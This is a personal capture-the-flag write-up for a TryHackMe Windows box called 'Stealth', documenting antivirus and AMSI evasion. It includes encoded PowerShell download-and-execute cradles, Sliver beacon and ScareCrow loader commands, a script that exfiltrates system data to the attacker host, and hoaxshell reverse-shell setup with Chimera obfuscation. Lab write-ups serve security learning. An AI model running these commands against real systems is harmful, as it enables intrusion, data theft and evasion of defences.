# Stealth Writeup

Name: Stealth
Date:  
Difficulty:  Medium
Goals:  
- AV evasion - three hours max
TrLearnt:
Beyond Root:
- Hey - Use hoaxshell

- [[Stealth-Notes.md]]
- [[Stealth-CMD-by-CMDs.md]]

I peaked to much at [Tyler Ramsbey's Stealth - Detailed Walkthrough -- [TryHackMe LIVE!]](https://www.youtube.com/watch?v=iICjs8754yE)
## Recon of machine and alternatives

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](Screenshots/ping.png)

- PowerShell Contrained Language mode
- AMSI
- Windows Defender
#### Fruits of the Internet Approach 

[HackTricks](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters), [PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/Methodology%20and%20Resources/), [lolbas-project.github.io](https://lolbas-project.github.io/lolbas/)
see [[Stealth-Notes]] for more

```bash
kali> echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0
PS> powershell -EncodedCommand <Base64>
```

Sliver Beacon
```bash
generate beacon --mtls  10.11.3.193:8080 --arch amd64 --os windows --save /tmp/8080-sliver.bin -f shellcode -G


mtls -L  10.11.3.193 -l 8080

/opt/ScareCrow/ScareCrow -I /tmp/8080-sliver.bin -Loader binary -domain microsoft.com -obfu -Evasion KnownDLL 
# Build with golang
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"
# Pack with upx
upx Word.exe


```

```powershell
Copy-Item -Path "\\10.11.3.193\Share\Word.exe" -Destination "C:\Programdata\Word.exe"
Start-Job -ScriptBlock { Start-Process -FilePath "C:\Programdata\Word.exe" -Wait -WindowStyle Hidden }
```
- https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/start-process?view=powershell-7.4
#### Bran from my Brain Approach 

- Make it less black-box - forward output back to my box
	- AMSI bypass

- Enumerator
	- PowerShell Version
	- Contrained Language mode
	- AMSI enumerator
	- Get-Process - check for Windows Defender
	- Check if LOLBASes exist - !!

- Exfil Data
	- WebDAV server
	- impacket-smbserver


This was the initial script to enumerate 
```powershell
$pwshCSL = $ExecutionContext.SessionState.LanguageMode
$pwshCmds = Command *
$ISMAprovider = Get-ChildItem -Path 'HKLM:\SOFTWARE\Classes\CLSID\{2781761E-28E0-4109-99FE-B9D127C57AFE}'
$applockPol = Get-AppLockerPolicy -Effective
$allProcs = Get-Process
$boxInfo = Get-ComputerInfo
$WinDStat = Get-MpComputerStatus
$logMallProviders = logman query providers
$logMISMAProvider = logman query providers Microsoft-Antimalware-Scan-Interface
Write-Output "================================================================================" > C:\programdata\info.txt
Write-Output "The Happy, Safe and Friendly PowerShell Checking your PowerShell Secruity Script" >> C:\programdata\info.txt
Write-Output "================================================================================" >> C:\programdata\info.txt
Write-Output $pwshCSL >> C:\programdata\info.txt
Write-Output $pwshCmds >> C:\programdata\info.txt
Write-Output $ISMAprovider >> C:\programdata\info.txt
Write-Output $applockPol >> C:\programdata\info.txt
Write-Output $allProcs >> C:\programdata\info.txt
Write-Output $boxInfo >> C:\programdata\info.txt
Write-Output $WinDStat >> C:\programdata\info.txt
Write-Output $logMallProviders >> C:\programdata\info.txt
Write-Output $logMISMAProvider >> C:\programdata\info.txt
Copy-Item -Path "C:\programdata\info.txt" -Destination "\\10.11.3.193\Share"

```
- https://www.ired.team/offensive-security/code-execution/powershell-constrained-language-mode-bypass
- https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters
- https://swisskyrepo.github.io/PayloadsAllTheThings/Methodology%20and%20Resources/Windows%20-%20Defenses/#applocker
- https://swisskyrepo.github.io/PayloadsAllTheThings/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute/
- https://swisskyrepo.github.io/PayloadsAllTheThings/Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/#which-endpoint-protection-is-using-amsi

![](callbackfromhostevasiononenumscript.png)

![](smbserverclosingconnections.png)



```bash
wsgidav --port=80 --host=10.11.3.193 --root=$(pwd) --auth=anonymous
```
Or
```bash
# Pipe out to a file do not just do want the nice women wrote down like an idiot
nc -lvnp 80

i
```
[Discovered CSbyGB - Woman Hacker of the Year 2022's notes](https://csbygb.gitbook.io/pentips/cs-by-gb-pentips/readme) 

Upload to a `wsgidav` server
```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\programdata\info.txt' -Encoding Byte))
Invoke-WebRequest -Uri http://10.11.3.193:80/ -Method POST -Body $b64
```

smb did not work...
![](httpfinally.png)

Understanding the issues with [cyberchef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9-_',true,false)Remove_null_bytes())
![](toomanycmds.png)

[The Archive must be the best!](https://csbygb.gitbook.io/pentips/post-exploitation/file-transfers#powershell-invoke-webrequest)
```bash
cat info.txt.b64 | grep -v 'POST\|User-Agent\|Content-Type\|Host\|Content-Length\|Expect\|Connection' > info.txt.b64.cyberchef

# Cyberchef recipe
`#recipe=From_Base64('A-Za-z0-9-_',false,false)Remove_null_bytes()`
```


![](notsoelegantsolution.png)

#### Enumeration Takeaways

- We can not infil in low-hanging-possiblities
	- certutil
- We can exfil through http
- Window Server 2019
- Full Language mode
- AMSI present
- Windows Defender present 

```powershell
WindowsBuildLabEx                                       : 17763.1.amd64fre.rs5_release.180914-1434
WindowsCurrentVersion                                   : 6.3
WindowsEditionId                                        : ServerDatacenter
WindowsInstallationType                                 : Server
WindowsInstallDateFromRegistry                          : 3/17/2021 2:59:06 PM
WindowsProductId                                        : 00430-00000-00000-AA191
WindowsProductName                                      : Windows Server 2019 Datacenter
WindowsRegisteredOrganization                           : Amazon.com
WindowsRegisteredOwner                                  : EC2
WindowsSystemRoot                                       : C:\Windows
WindowsVersion                                          : 1809
...
# output clipped
...
AMEngineVersion                  : 1.1.23080.2005
AMProductVersion                 : 4.18.23080.2006
AMRunningMode                    : Normal
AMServiceEnabled                 : True
AMServiceVersion                 : 4.18.23080.2006
AntispywareEnabled               : True
AntispywareSignatureAge          : 129
AntispywareSignatureLastUpdated  : 9/4/2023 7:28:08 AM
AntispywareSignatureVersion      : 1.397.358.0
AntivirusEnabled                 : True
AntivirusSignatureAge            : 129
AntivirusSignatureLastUpdated    : 9/4/2023 7:28:08 AM
AntivirusSignatureVersion        : 1.397.358.0
```

See info.txt for more.

#### Trying bypasses first

- Bypass AMSI and run in memory
- [AMSI documentation](https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal)
	- *Starting in Windows 10, version 1903, if your AMSI provider DLL is not Authenticode-signed, then it may not be loaded (depending on how the host machine is configured). For full details, see [**IAntimalwareProvider** interface](https://learn.microsoft.com/en-us/windows/desktop/api/amsi/nn-amsi-iantimalwareprovider).*

![](patt-startinghereforamsibypasses.png)

The play being that once successful bypassing AMSI I then I may have to execute in memory as there may be a nasty custom script to re-enable or restart AMSI every couple of minutes as AMSI can be unhooked, reflected state to itself, etc. 

From early adding a chunking and recombining into a big base64 blob 
```bash
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.11.3.193/ipt.ps1')" | iconv --to-code UTF-16LE | base64 -w0  


powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMQAuADMALgAxADkAMwAvAGkAcAB0AC4AcABzADEAJwApAA==

```

![](wehavehit.png)

```bash
echo -n "IEX(New-Object Net.WebClient).downloadFile('http://10.11.3.193/Word.exe')" | iconv --to-code UTF-16LE | base64 -w0  


powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAxAC4AMwAuADEAOQAzAC8AVwBvAHIAZAAuAGUAeABlACcAKQA=
```

## After three hours I decided to get a hint

[Stealth - Detailed Walkthrough -- TryHackMe LIVE!](https://www.youtube.com/watch?v=iICjs8754yE) - use hoaxshell

*As of 2022-10-18, hoaxshell is detected by AMSI ([malware-encyclopedia](https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?name=VirTool%3aPowerShell%2fXoashell.A&threatid=2147833654)). You need to obfuscate the generated payload in order to use. Check out this video on how to obfuscate manually and bypass MS Defender:*

```
git clone https://github.com/t3l3machus/hoaxshell
cd ./hoaxshell
sudo pip3 install -r requirements.txt
chmod +x hoaxshell.py

python3 hoaxshell.py -s 10.11.3.193 -p 8443 -i -H "Authorization" -x "C:\programdata\update.ps1"
```

![1080](whatdoeshoaxshellactuallydo.png)

It did not work, obfuscation time.
- Changed variable names

```powershell
$Encoded = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes())



$gohere=[System.Text.Encoding]::Utf8.GetString([System.Convert]::FromBase64String('MQAwAC4AMQAxAC4AMwAuADEAOQAzADoAOAA0ADQAMwA='))
```
- from https://medium.com/@SecureTacticsTS/simple-but-effective-powershell-obfuscation-techniques-b38900d8f7dd

- https://github.com/tokyoneon/Chimera

Tried a more profession way...
```bash
./chimera.sh -f /home/kali/Stealth-Data/hoaxshell-basic.ps1 -a -o /home/kali/Stealth-Data/chimera-hoaxshell.ps1
```


![](wehavelandedonthemachine.png)

![](flagisinanotherlocationonstealth.png)

![](stealthistrollingme.png)

I peaked at the walkthrough just to get this done. Its been 4 hours and I need to move forward.
- webshell 
- godpotato - never heard of this.


## Post-Root-Reflection  

- Hoaxshell can work with
- Chimera
- AV/AMSI bypassing is best left to open source tools for the most part to brunt of work at this point in time; trying too hard has already been done by everyone else

## Beyond Root

- Use Hoaxshell!


